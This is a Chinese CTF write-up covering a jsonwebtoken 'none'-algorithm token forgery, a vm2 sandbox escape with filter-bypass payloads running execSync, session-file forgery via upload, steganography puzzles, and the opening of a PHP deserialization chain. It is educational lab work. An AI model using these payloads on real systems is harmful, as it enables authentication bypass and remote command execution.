<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line">secretid=<span class="number">0.5</span>;</span><br><span class="line">username=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">password=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">rolled=<span class="string">&quot;no&quot;</span></span><br><span class="line"><span class="keyword">const</span> secret = crypto.randomBytes(<span class="number">18</span>).toString(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> token = jwt.sign(&#123;secretid, username, password,rolled&#125;, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&#x27;none&#x27;</span>&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(token);</span><br><span class="line"><span class="keyword">const</span> sid = <span class="built_in">JSON</span>.parse(Buffer.from(token.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;base64&#x27;</span>).toString());</span><br><span class="line"><span class="built_in">console</span>.log(sid)</span><br></pre></td></tr></table></figure>

<p>这里要注意的是先注册一个账号然后再提交上面生成的JWT，因为不能让<code>global.secrets</code>这个数组为<code>undefined</code>，我们需要注册一个账号是的其初始化。</p>
<p>原理是用小数绕过 secretid 的限制，将 secret 置空。发现本题考点为利用 node 的 jsonwebtoken 库的已知缺陷：当 jwt secret 为空时，jsonwebtoken 会采用 algorithm none 进行解密。</p>
<p>伪造 secretid 为小数的 token，让 secret 成为 undefined，导致 algorithm 为 none 进而使用户变成 admin</p>
<p>然后这是脚本生成的jwt：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzZWNyZXRpZCI6MC41LCJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJhZG1pbiIsInJvbGxlZCI6Im5vIiwiaWF0IjoxNTg3NjQ0MDk4fQ.</span><br></pre></td></tr></table></figure>

<p>然后改包发送：</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200423211337775.png" alt="image-20200423211337775" style="high:80%;width:80%;" />

<p>再放包放到home这个页面就可以刷新网页进入getflag的界面了。再抓getflag的包发送即可看到flag。</p>
<p>这上面是师兄的思路，官方的脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">base_url = <span class="string">&quot;http://290fb4fb-dc63-46e7-988d-37edb35934ad.node3.buuoj.cn&quot;</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">res = s.post(base_url+<span class="string">&#x27;/api/register&#x27;</span>, data=&#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;hhh&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;hhh&quot;</span>&#125;)</span><br><span class="line">token = jwt.encode(&#123;<span class="string">&quot;secretid&quot;</span>:<span class="number">0.333</span>,<span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;admin&quot;</span>&#125;,algorithm=<span class="string">&quot;none&quot;</span>,key=<span class="string">&quot;&quot;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">res = s.post(base_url+<span class="string">&#x27;/api/login&#x27;</span>, data=&#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;authorization&quot;</span>: token&#125;)</span><br><span class="line"></span><br><span class="line">res = s.get(base_url+<span class="string">&#x27;/api/flag&#x27;</span>)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>

<p>直接运行也可以得到flag。</p>
<h3 id="just-escape"><a href="#just-escape" class="headerlink" title="just_escape"></a><strong>just_escape</strong></h3><p>打开F12发现这个：X-Powered-By：Express</p>
<p>运行代码 <code>run.php?code=Error().stack</code> 根据报错信息发现是 vm2 的沙盒逃逸问题。搜索可得 vm2 最新沙盒逃逸 poc：<a class="foo" target="_blank" href="https://github.com/patriksimek/vm2/issues/225">传送门</a></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">TypeError</span>.prototype.get_process = <span class="function"><span class="params">f</span>=&gt;</span>f.constructor(<span class="string">&quot;return process&quot;</span>)();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">&quot;&quot;</span>)).a = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="keyword">return</span> e.get_process(<span class="function">()=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;whoami&quot;</span>).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>

<p>直接使用的话发现存在waf:</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200423213317676.png" alt="image-20200423213317676" style="high:80%;width:80%;" />

<p>fuzz发现程序过滤了以下关键字：</p>
<p>process, exec, eval, constructor, prototype, Function, 加号, 双引号, 单引号被过滤</p>
<p>绕过方式如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`return proces`</span>&#125;</span>s`</span>&#125;</span>`</span></span><br></pre></td></tr></table></figure>

<p>最后修改为：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="built_in">TypeError</span>[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`prototyp`</span>&#125;</span>e`</span>&#125;</span>`</span>][<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`get_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>] = <span class="function"><span class="params">f</span>=&gt;</span>f[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`constructo`</span>&#125;</span>r`</span>&#125;</span>`</span>](<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`return this.proces`</span>&#125;</span>s`</span>&#125;</span>`</span>)();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">         <span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">``</span>)).a = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="keyword">return</span> e[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`get_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>](<span class="function">()=&gt;</span>&#123;&#125;).mainModule[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`requir`</span>&#125;</span>e`</span>&#125;</span>`</span>](<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`child_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>)[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`exe`</span>&#125;</span>cSync`</span>&#125;</span>`</span>](<span class="string">`cat /flag`</span>).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>

<p>然后发现其他人的writeup直接在code后面加个[]就可以了。emmm</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://90694257-8da6-479a-9ea9-cc97c08e88cd.node3.buuoj.cn/run.php?code[]=(function()&#123;</span><br><span class="line">    TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        Object.preventExtensions(Buffer.<span class="keyword">from</span>(<span class="string">&quot;&quot;</span>)).a = <span class="number">1</span>;</span><br><span class="line">    &#125;catch(e)&#123;</span><br><span class="line">        return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;cat /flag&quot;).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>

<h3 id="BabyUpload"><a href="#BabyUpload" class="headerlink" title="BabyUpload"></a><strong>BabyUpload</strong></h3><p>源码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_save_path(<span class="string">&quot;/var/babyctf/&quot;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;username&#x27;</span>] ===<span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $filename=<span class="string">&#x27;/var/babyctf/success.txt&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">            safe_delete($filename);</span><br><span class="line">            <span class="keyword">die</span>($flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;username&#x27;</span>] =<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$direction = filter_input(INPUT_POST, <span class="string">&#x27;direction&#x27;</span>);</span><br><span class="line">$attr = filter_input(INPUT_POST, <span class="string">&#x27;attr&#x27;</span>);</span><br><span class="line">$dir_path = <span class="string">&quot;/var/babyctf/&quot;</span>.$attr;</span><br><span class="line"><span class="keyword">if</span>($attr===<span class="string">&quot;private&quot;</span>)&#123;</span><br><span class="line">    $dir_path .= <span class="string">&quot;/&quot;</span>.$_SESSION[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($direction === <span class="string">&quot;upload&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_uploaded_file($_FILES[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;invalid upload&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $file_path = $dir_path.<span class="string">&quot;/&quot;</span>.$_FILES[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        $file_path .= <span class="string">&quot;_&quot;</span>.hash_file(<span class="string">&quot;sha256&quot;</span>,$_FILES[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\.\.\/|\.\.\\\\)/&#x27;</span>, $file_path))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;invalid file path&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        @mkdir($dir_path, <span class="number">0700</span>, <span class="literal">TRUE</span>);</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($_FILES[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],$file_path))&#123;</span><br><span class="line">            $upload_result = <span class="string">&quot;uploaded&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;error while saving&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">RuntimeException</span> $e) &#123;</span><br><span class="line">        $upload_result = $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">elseif</span> ($direction === <span class="string">&quot;download&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        $filename = basename(filter_input(INPUT_POST, <span class="string">&#x27;filename&#x27;</span>));</span><br><span class="line">        $file_path = $dir_path.<span class="string">&quot;/&quot;</span>.$filename;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\.\.\/|\.\.\\\\)/&#x27;</span>, $file_path))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;invalid file path&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!file_exists($file_path)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;file not exist&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        header(<span class="string">&#x27;Content-Type: application/force-download&#x27;</span>);</span><br><span class="line">        header(<span class="string">&#x27;Content-Length: &#x27;</span>.filesize($file_path));</span><br><span class="line">        header(<span class="string">&#x27;Content-Disposition: attachment; filename=&quot;&#x27;</span>.substr($filename, <span class="number">0</span>, <span class="number">-65</span>).<span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(readfile($file_path))&#123;</span><br><span class="line">            $download_result = <span class="string">&quot;downloaded&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;error while saving&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">RuntimeException</span> $e) &#123;</span><br><span class="line">        $download_result = $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>如何得到flag呢，<code>session</code>必须得是<code>admin</code>其次必须存在success.txt。</p>
<p>首先这里两个POST参数，direction是用来选择上传或读取的，attr会被拼接到路径中。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$direction = filter_input(INPUT_POST, <span class="string">&#x27;direction&#x27;</span>);</span><br><span class="line">$attr = filter_input(INPUT_POST, <span class="string">&#x27;attr&#x27;</span>);</span><br><span class="line">$dir_path = <span class="string">&quot;/var/babyctf/&quot;</span>.$attr;</span><br></pre></td></tr></table></figure>

<p>再看upload的部分</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($direction === <span class="string">&quot;upload&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_uploaded_file($_FILES[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]))&#123;</span><br><span class="line">            throw new RuntimeException(<span class="string">&#x27;invalid upload&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $file_path = $dir_path.<span class="string">&quot;/&quot;</span>.$_FILES[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        $file_path .= <span class="string">&quot;_&quot;</span>.hash_file(<span class="string">&quot;sha256&quot;</span>,$_FILES[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>这里会将路径拼接，也就是：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">/var/babyctf/$_POST[<span class="string">&#x27;attr&#x27;</span>]/文件名_sha256(临时文件名)</span><br></pre></td></tr></table></figure>

<p>从源码开头的：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">session_save_path(<span class="string">&quot;/var/babyctf/&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>可以得知修改attr为空，文件名为sess，便可以伪造session文件。</p>
<p>下一步就是利用download读取自己的session，发现session内容格式，得知session引起为php_binary。</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200424145858004.png" alt="image-20200424145858004" style="high:60%;width:60%;" />

<p>在源代码里面是这样的</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200424145951565.png" alt="image-20200424145951565" style="high:60%;width:60%;" />

<p>然后直接复制出来保存在sess的文件里面，并把guest改为admin。并上传到靶机上面：</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200424150334856.png" alt="image-20200424150334856" style="high:80%;width:80%;" />

<p>然后可以测试出来sess的文件的hash值：</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200424150522602.png" alt="image-20200424150522602" style="high:80%;width:80%;" />

<p>然后可以用download的方式查看一下是否上传成功了：</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200424150642155.png" alt="image-20200424150642155" style="high:80%;width:80%;" />

<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200424150705164.png" alt="image-20200424150705164" style="high:80%;width:80%;" />

<p>可以看到已经成功改为admin。</p>
<p>不过还需要有一个success.txt，由于他这里用的是file_exists，所以我们令attr=success.txt使之成为一个路径也能通过检测。然后这里的文件随便填就行。</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200424154207639.png" alt="image-20200424154207639" style="high:80%;width:80%;" />

<p>这样两个条件都满足了，抓包改PHPSESSID即可得到flag。</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200424154520097.png" alt="image-20200424154520097" style="high:80%;width:80%;" />

<h2 id="MRCTF"><a href="#MRCTF" class="headerlink" title="MRCTF"></a><strong>MRCTF</strong></h2><h3 id="你能看懂音符吗"><a href="#你能看懂音符吗" class="headerlink" title="你能看懂音符吗"></a><strong>你能看懂音符吗</strong></h3><p>用010打开后改一下发现文件头被改，把61 52改为52 61即可。</p>
<p>然后发现打开docx，显示隐藏文字，然后发现一段音符：</p>
<p>♭♯♪‖¶♬♭♭♪♭‖‖♭♭♬‖♫♪‖♩♬‖♬♬♭♭♫‖♩♫‖♬♪♭♭♭‖¶∮‖‖‖‖♩♬‖♬♪‖♩♫♭♭♭♭♭§‖♩♩♭♭♫♭♭♭‖♬♭‖¶§♭♭♯‖♫∮‖♬¶‖¶∮‖♬♫‖♫♬‖♫♫§=</p>
<p>然后直接在这个网站解密即可得到flag：<a class="foo" target="_blank" href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue">传送门</a></p>
<h3 id="不眠之夜"><a href="#不眠之夜" class="headerlink" title="不眠之夜"></a><strong>不眠之夜</strong></h3><p>打开之后发现有很多图片，直接使用命令合在一起</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">montage *.jpg -geometry +<span class="number">0</span>+<span class="number">0</span>+<span class="number">0</span> ok.jpg</span><br></pre></td></tr></table></figure>

<p>然后用gaps这个工具自动拼图：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">gaps --image=ok.jpg --generations=<span class="number">50</span> --population=<span class="number">120</span> --size=<span class="number">50</span></span><br></pre></td></tr></table></figure>

<h3 id="寻找xxx"><a href="#寻找xxx" class="headerlink" title="寻找xxx"></a><strong>寻找xxx</strong></h3><p>打开wav文件电话拨号声，直接扔dtmf读取出来，然后手动去重，因为有干扰声。工具：<a class="foo" target="_blank" href="https://github.com/hfeeki/dtmf">传送门</a></p>
<p>使用工具的时候在dtmf-decoder.py文件里面把：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># load wav file</span></span><br><span class="line">    wav = wave.open(<span class="string">&#x27;1.wav&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>1.wav换成题目的wav即可。结果为：18684221609。</p>
<h3 id="Hello-misc"><a href="#Hello-misc" class="headerlink" title="Hello_ misc"></a><strong>Hello_ misc</strong></h3><p>打开题目是一个压缩包和一张图片：</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200424211603839.png" alt="image-20200424211603839" style="high:60%;width:60%;" />

<p>binwalk这个try图片可以得到一个ZIP压缩包。</p>
<p>然后再用用<code>stegsolve</code>查看图片，<code>Save Bin</code>可直接得到图片：</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200424212518740.png" alt="image-20200424212518740" style="high:80%;width:80%;" />

<p>用图片上的密码打开ZIP压缩包。发现文档信息：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">127</span></span><br><span class="line"><span class="number">255</span></span><br><span class="line"><span class="number">63</span></span><br><span class="line"><span class="number">191</span></span><br><span class="line"><span class="number">127</span></span><br><span class="line"><span class="number">191</span></span><br><span class="line"><span class="number">63</span></span><br><span class="line"><span class="number">127</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>观察可知文档中只含有 <strong>127 255 63 191</strong> 这四个数字，将这四个数字转化为二进制，可以看到这四个数字的二进制形式中 <strong>只有最高两位的二进制数不同</strong> ，将其最高两位提取出来组合在一起转化为ASCII，可以得到rar密码：</p>
<p>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = open(<span class="string">&#x27;../out.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">a = f.readlines()</span><br><span class="line">p = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">	p.append(int(i))</span><br><span class="line"></span><br><span class="line">s=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> p:</span><br><span class="line">	<span class="keyword">if</span> i ==<span class="number">63</span>:</span><br><span class="line">		a = <span class="string">&#x27;00&#x27;</span></span><br><span class="line">	<span class="keyword">elif</span> i== <span class="number">127</span>:</span><br><span class="line">		a= <span class="string">&#x27;01&#x27;</span></span><br><span class="line">	<span class="keyword">elif</span> i== <span class="number">191</span>:</span><br><span class="line">		a=<span class="string">&#x27;10&#x27;</span></span><br><span class="line">	<span class="keyword">elif</span> i== <span class="number">255</span>:</span><br><span class="line">		a=<span class="string">&#x27;11&#x27;</span></span><br><span class="line">	s +=a</span><br><span class="line"></span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(s),<span class="number">8</span>):</span><br><span class="line">	result += chr(int(s[i:i+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>

<p>到rar包的解压密码：<strong>0ac1fe6b77be5dbe</strong></p>
<p>解压可以得到一个zip包，看zip包里的内容(里面都是xml)可以知道这是一个 <strong>docx</strong> 文件，改后缀为docx得到最终的文件。</p>
<p>将文件内容全选改为深色，可以看到在文档的最下方藏有几串字符</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200424212849538.png" alt="image-20200424212849538" style="high:80%;width:80%;" />

<p>再base64解密：</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200424212915052.png" alt="image-20200424212915052" style="high:80%;width:80%;" />

<h3 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a><strong>ezpop</strong></h3><p>首先说一下</p>
<p>PHP类中的<code>__get</code>和<code>__set</code>函数。</p>
<p>当试图获取一个不可达属性时(比如private)，类会自动调用<code>__get</code>函数。</p>
<p>当试图设置一个不可达属性时(比如private)，类会自动调用<code>__set</code>函数。</p>
<p>举一个例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">&#x27;周伯通&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> $sex = <span class="string">&#x27;男&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$class = <span class="keyword">new</span> Person();</span><br><span class="line"><span class="keyword">echo</span> $class-&gt;sex;</span><br></pre></td></tr></table></figure>

<p>这里$sex声明了私用变量，私有变量或方法在类实例化是不能直接访问的，所以上面会抛出异常。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Fatal error: Uncaught Error: Cannot access private property Person::$sex </span><br></pre></td></tr></table></figure>

<p>然后改造一下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">&#x27;周伯通&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> $sex = <span class="string">&#x27;男&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$name</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;个人信息:&#x27;</span>.$name.<span class="keyword">$this</span>-&gt;sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$class = <span class="keyword">new</span> Person();</span><br><span class="line"><span class="keyword">echo</span> $class-&gt;sex;</span><br></pre></td></tr></table></figure>

<p>这里输出的是个人信息:sex男。</p>
<p>可以看出<code>__get</code>方法自动调用了，并可以访问私有变量。</p>
<p>再来看一下<code>__set</code>函数，同样也是先使用可达的私有属性：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">&#x27;周伯通&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> $sex = <span class="string">&#x27;男&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params">$name, $val</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;个人信息:&#x27;</span>.$name. $val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$class = <span class="keyword">new</span> Person();</span><br><span class="line">$class-&gt;sex = <span class="string">&#x27;女&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">个人信息:sex女</span><br></pre></td></tr></table></figure>

<p>可以看到因为设置了不可达属性$sex，所以成功调用了<code>__set</code>函数并输出。</p>
<p><code>__invoke()</code> 函数会在一个类被当成函数调用时被触发。例如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CallableClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params">$param1, $param2</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        var_dump($param1,$param2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$obj  = <span class="keyword">new</span> CallableClass();</span><br><span class="line">$obj(<span class="number">123</span>, <span class="number">456</span>);</span><br><span class="line">var_dump(is_callable($obj));</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">int(<span class="number">123</span>)</span><br><span class="line">int(<span class="number">456</span>)</span><br><span class="line">bool(true)</span><br></pre></td></tr></table></figure>

<p>再来看看这道题目</p>
<h4 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a><strong>题目源码</strong></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line">&lt;?php</span><br><span class="line">//flag <span class="keyword">is</span> <span class="keyword">in</span> flag.php</span><br><span class="line">//WTF IS THIS?</span><br><span class="line">//Learn From https://ctf.ieki.xyz/library/php.html<span class="comment">#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line">//And Crack It!</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var;</span><br><span class="line">    public function append($value)&#123;</span><br><span class="line">        include($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;append($this-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file=<span class="string">&#x27;index.php&#x27;</span>)&#123;</span><br><span class="line">        $this-&gt;source = $file;</span><br><span class="line">        echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;str-&gt;source;</span><br><span class="line">    